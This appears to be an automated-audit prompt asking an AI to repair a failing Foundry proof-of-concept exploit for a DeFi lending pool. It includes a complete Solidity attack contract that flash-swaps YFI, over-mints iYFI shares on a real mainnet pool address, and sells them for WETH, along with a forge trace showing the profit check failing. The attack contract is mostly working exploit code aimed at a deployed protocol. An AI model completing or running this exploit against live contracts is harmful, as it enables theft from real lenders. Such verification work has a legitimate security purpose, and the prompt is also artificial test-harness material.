You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Minting trusts the requested ERC20 deposit amount instead of the amount actually received
- claim: The mint path prices shares from the caller-supplied `depositAmount` before any transfer happens, then only checks whether `transferFrom` returned success. It never measures the contract's actual balance delta, so a fee-on-transfer or otherwise deflationary `loanTokenAddress` can deliver fewer tokens than `depositAmount` while the minter still receives shares as if the full amount arrived.
- impact: An attacker can over-mint iTokens, diluting existing lenders and later redeeming more underlying than they contributed. If enough liquidity exists, this can make the pool insolvent.
- exploit_paths: ["Use a pool whose `loanTokenAddress` burns, taxes, or otherwise transfers less than the requested amount.", "Call `mint(receiver, X)` so `_safeTransferFrom` succeeds but the contract receives less than `X`.", "Receive shares computed from `X`, then burn them later for a disproportionate amount of underlying."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface ILoanTokenLike {
    function loanTokenAddress() external view returns (address);
    function tokenPrice() external view returns (uint256);
    function mint(address receiver, uint256 depositAmount) external returns (uint256);
    function flashBorrow(
        uint256 borrowAmount,
        address borrower,
        address target,
        string calldata signature,
        bytes calldata data
    ) external returns (bytes memory);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant TARGET = 0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant YFI = 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e;
    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    ILoanTokenLike internal constant POOL = ILoanTokenLike(TARGET);

    struct Route {
        address fundingPair;
        address exitPair;
        uint256 fundingAmount;
        uint256 predictedProfit;
    }

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    string public status;
    string public exploitPathUsed;

    uint256 public attackerSpendAmount;
    uint256 public poolReceiveAmount;
    uint256 public burnReturnAmount;

    address public flashPair;
    address public exitPair;
    address public loanToken;

    uint256 internal _profitAmount;

    constructor() {
        status = "not-run";
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        require(!executed, "ALREADY_EXECUTED");
        executed = true;

        loanToken = POOL.loanTokenAddress();
        if (loanToken != YFI) {
            _refute("refuted:unexpected-underlying", "expected-live-market=iYFI");
            return;
        }

        Route memory route = _selectBestRoute();
        if (route.fundingPair == address(0) || route.exitPair == address(0) || route.fundingAmount == 0) {
            _refute("refuted:no-profitable-public-route", "public-liquidity-funding-or-exit-unavailable");
            return;
        }

        flashPair = route.fundingPair;
        exitPair = route.exitPair;
        attackerSpendAmount = route.fundingAmount;

        _safeApprove(YFI, TARGET, type(uint256).max);

        IUniswapV2PairLike pair = IUniswapV2PairLike(route.fundingPair);
        bool yfiIsToken0 = pair.token0() == YFI;
        bytes memory data = abi.encode(route.exitPair, route.fundingAmount);

        if (yfiIsToken0) {
            pair.swap(route.fundingAmount, 0, address(this), data);
        } else {
            pair.swap(0, route.fundingAmount, address(this), data);
        }

        _profitAmount = IERC20Like(WETH).balanceOf(address(this));
        require(_profitAmount > 0, "NO_PROFIT");

        hypothesisValidated = true;
        status = "validated";
        exploitPathUsed =
            "public-YFI-flashswap->mint-iYFI-at-pool-price->dump-received-iYFI-into-public-liquidity";
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "BAD_SENDER");
        require(msg.sender == flashPair, "BAD_PAIR");

        (address chosenExitPair, uint256 fundingAmount) = abi.decode(data, (address, uint256));
        uint256 yfiBorrowed = amount0 > 0 ? amount0 : amount1;
        require(yfiBorrowed == fundingAmount, "BAD_AMOUNT");

        uint256 poolBalanceBefore = IERC20Like(YFI).balanceOf(TARGET);
        POOL.mint(address(this), yfiBorrowed);
        poolReceiveAmount = IERC20Like(YFI).balanceOf(TARGET) - poolBalanceBefore;

        uint256 iYfiAmount = IERC20Like(TARGET).balanceOf(address(this));
        require(iYfiAmount > 0, "NO_ITOKENS");

        uint256 wethOut = _swapExactTokenForWeth(chosenExitPair, TARGET, iYfiAmount);
        burnReturnAmount = wethOut;

        uint256 wethRepayAmount = _quoteFundingPairRepaymentWeth(msg.sender, yfiBorrowed);
        _safeTransfer(WETH, msg.sender, wethRepayAmount);
    }

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _selectBestRoute() internal view returns (Route memory best) {
        address[2] memory fundingPairs = [
            IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(YFI, WETH),
            IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(YFI, WETH)
        ];

        address[2] memory exitPairs = [
            IUniswapV2FactoryLike(SUSHISWAP_FACTORY).getPair(TARGET, WETH),
            IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(TARGET, WETH)
        ];

        uint256 currentPrice = POOL.tokenPrice();
        uint256 poolBalance = IERC20Like(YFI).balanceOf(TARGET);
        if (currentPrice == 0) {
            return best;
        }

        uint256[16] memory divisors = [uint256(256), 192, 160, 128, 96, 80, 64, 48, 40, 32, 24, 20, 16, 12, 10, 8];

        for (uint256 i = 0; i < fundingPairs.length; i++) {
            if (fundingPairs[i] == address(0)) {
                continue;
            }

            for (uint256 j = 0; j < exitPairs.length; j++) {
                if (exitPairs[j] == address(0)) {
                    continue;
                }

                for (uint256 k = 0; k < divisors.length; k++) {
                    (uint256 fundingAmount, uint256 predictedProfit) = _scoreRoute(
                        fundingPairs[i],
                        exitPairs[j],
                        divisors[k],
                        currentPrice,
                        poolBalance
                    );

                    if (predictedProfit > best.predictedProfit) {
                        best = Route({
                            fundingPair: fundingPairs[i],
                            exitPair: exitPairs[j],
                            fundingAmount: fundingAmount,
                            predictedProfit: predictedProfit
                        });
                    }
                }
            }
        }
    }

    function _scoreRoute(
        address fundingPair,
        address chosenExitPair,
        uint256 divisor,
        uint256 currentPrice,
        uint256 poolBalance
    ) internal view returns (uint256 fundingAmount, uint256 predictedProfit) {
        (uint256 reserveYfi, uint256 reserveWeth) = _pairReservesFor(fundingPair, YFI, WETH);
        (uint256 reserveIYfi, uint256 exitReserveWeth) = _pairReservesFor(chosenExitPair, TARGET, WETH);

        if (reserveYfi == 0 || reserveWeth == 0 || reserveIYfi == 0 || exitReserveWeth == 0) {
            return (0, 0);
        }

        fundingAmount = reserveYfi / divisor;
        if (fundingAmount == 0 || fundingAmount + poolBalance <= fundingAmount) {
            return (0, 0);
        }

        uint256 totalIMint = (fundingAmount * 1e18) / currentPrice;
        if (totalIMint == 0) {
            return (0, 0);
        }

        uint256 wethOut = _getAmountOut(totalIMint, reserveIYfi, exitReserveWeth);
        uint256 wethRepay = _getAmountIn(fundingAmount, reserveWeth, reserveYfi);
        if (wethOut <= wethRepay) {
            return (0, 0);
        }

        predictedProfit = wethOut - wethRepay;
    }

    function _swapExactTokenForWeth(address pair, address tokenIn, uint256 amountIn) internal returns (uint256 amountOut) {
        (uint256 reserveIn, uint256 reserveOut) = _pairReservesFor(pair, tokenIn, WETH);
        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);

        _safeTransfer(tokenIn, pair, amountIn);

        IUniswapV2PairLike uniPair = IUniswapV2PairLike(pair);
        if (uniPair.token0() == tokenIn) {
            uniPair.swap(0, amountOut, address(this), new bytes(0));
        } else {
            uniPair.swap(amountOut, 0, address(this), new bytes(0));
        }
    }

    function _quoteFundingPairRepaymentWeth(address pair, uint256 yfiAmountOut) internal view returns (uint256) {
        (uint256 reserveYfi, uint256 reserveWeth) = _pairReservesFor(pair, YFI, WETH);
        return _getAmountIn(yfiAmountOut, reserveWeth, reserveYfi);
    }

    function _pairReservesFor(address pair, address tokenIn, address tokenOut) internal view returns (uint256 reserveIn, uint256 reserveOut) {
        IUniswapV2PairLike uniPair = IUniswapV2PairLike(pair);
        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();
        if (uniPair.token0() == tokenIn && uniPair.token1() == tokenOut) {
            return (uint256(reserve0), uint256(reserve1));
        }
        require(uniPair.token0() == tokenOut && uniPair.token1() == tokenIn, "BAD_PAIR_TOKENS");
        return (uint256(reserve1), uint256(reserve0));
    }

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool success, bytes memory returndata) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(success && (returndata.length == 0 || abi.decode(returndata, (bool))), "APPROVE_FAILED");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool success, bytes memory returndata) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(success && (returndata.length == 0 || abi.decode(returndata, (bool))), "TRANSFER_FAILED");
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountIn > 0 && reserveIn > 0 && reserveOut > 0, "BAD_OUT_QUOTE");
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / ((reserveIn * 1000) + amountInWithFee);
    }

    function _getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        require(amountOut > 0 && reserveIn > 0 && reserveOut > amountOut, "BAD_IN_QUOTE");
        return ((reserveIn * amountOut * 1000) / ((reserveOut - amountOut) * 997)) + 1;
    }

    function _refute(string memory newStatus, string memory path) internal {
        hypothesisValidated = false;
        hypothesisRefuted = true;
        status = newStatus;
        exploitPathUsed = path;
        _profitAmount = 0;
    }
}

```

forge stdout (tail):
```
[0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [309385] FlawVerifier::executeOnOpportunity()
    │   ├─ [2377] 0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b::loanTokenAddress() [staticcall]
    │   │   └─ ← [Return] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x088ee5007C98a9677165D78dD2109AE4a3D04d0C
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x2fDbAdf3C4D5A8666Bc06645B8358ab803996E28
    │   ├─ [2644] 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [119137] 0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b::tokenPrice() [staticcall]
    │   │   ├─ [113921] 0x624f7f89414011b276C60EA2337bFba936D1CbBE::tokenPrice() [delegatecall]
    │   │   │   ├─ [105571] 0xD8Ee69652E4e4838f2531732a46d1f7F584F0b7f::4a1e88fe(0000000000000000000000007f3fe9d492a9a60aebb06d82cba23c6f32cad10b0000000000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   │   ├─ [100222] 0xbD4881Da92F764E4d7BDD7ef79af0C6585165F64::4a1e88fe(0000000000000000000000007f3fe9d492a9a60aebb06d82cba23c6f32cad10b0000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   │   │   ├─ [1166] 0xAE0886d167cCF942c4DAD960f5CFc9C3c7A2816E::986cfba3(fffffffffffffffffffffffffffffffffffffffffffffffffffffffffff36c04) [delegatecall]
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000174830a963
    │   │   │   │   │   ├─ [58340] 0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b::f96b660a(00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000174830a963) [staticcall]
    │   │   │   │   │   │   ├─ [57585] 0x624f7f89414011b276C60EA2337bFba936D1CbBE::f96b660a(00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000174830a963) [delegatecall]
    │   │   │   │   │   │   │   ├─ [2541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b) [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 5
    │   │   │   │   │   │   │   ├─ [42414] 0xFbdD8919c8B2ad0Ea06da5ca8BC4d3e29cf3D2e4::5e365593(0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000174830a963) [staticcall]
    │   │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000016345785d8a0000
    │   │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000016345785d8a0000
    │   │   │   │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000016345785d8a0000
    │   │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   ├─ [541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b) [staticcall]
    │   │   │   │   └─ ← [Return] 5
    │   │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   │   └─ ← [Return] 1000000000000000000 [1e18]
    │   ├─ [541] 0x0bc529c00C6401aEF6D220BE8C6Ea1667F6Ad93e::balanceOf(0x7F3Fe9D492A9a60aEBb06d82cBa23c6F32CAd10b) [staticcall]
    │   │   └─ ← [Return] 5
    │   └─ ← [Return]
    ├─ [344] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [462] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18695728 [1.869e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 17.26s (17.25s CPU time)

Ran 1 test suite in 17.27s (17.26s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 350053)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
